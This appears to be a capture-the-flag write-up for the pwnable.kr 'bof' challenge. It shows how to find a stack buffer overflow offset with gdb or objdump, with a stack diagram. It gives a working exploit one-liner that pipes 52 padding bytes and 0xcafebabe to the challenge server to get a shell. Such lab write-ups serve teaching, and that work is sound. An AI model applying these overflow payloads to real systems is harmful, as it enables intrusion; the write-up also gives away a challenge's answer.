#### pwnable-kr
##### Toddler's Bottle | bof challenge
**Note** </br>
if you are using 64 bit machine you need to install these:</br>
```
 $ sudo apt-get install libc6-i386
 $ sudo apt-get install g++-multilib
```

with these you can run bof in your system :) </br>
there are 2 way to solve this problem.

---
**one** </br>
use `gdb bof` and put breakpoint on func </br>
use `run` command and enter 32 `A` in the input </br>
Ok, lets inspect the memory. We can use `xw` to display 32bit words (instead of 8, making it easier for us to see our patterns).
```
(gdb) x/20xhw $esp
```
you can see 5 word after `A`s there is `deadbeaf`; so we must enter 13 word `A` (it means 52 `A`) and after than  `cafebabe` on the input.</br>

so use this command to make if condition be `TRUE` and after than write `cat flag` to see the flag.
</br>
```
$ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
```
---
**TWO**</br>
use `objdump`; on `func` you can see `$epb` has `0x2C` length.</br>
in this program, memory schema is like this:
```
|--------------------| High address
|                    |
|--------------------|
|  int key (4 Bytes) | <- method parameters
|--------------------|
|   SEIP (4 Bytes)   | <- saved EIP;(also called program counter) 
|--------------------|
|   sebp (4 Bytes)   | <- saved ebp
|--------------------|
|                    |
|        ebp         |
|    (0x2C Bytes)    |
|                    |
|--------------------|
|                    |
|--------------------| Low address
```
 so after you understand that you can write a code like [this](https://gist.github.com/Aseyed/db9c9685fef7f3b9399378f868aff3a3#file-pwnable-kr_bof-py) </br>
 run the code with python2 after that you can run `cat flag` to catch the flag

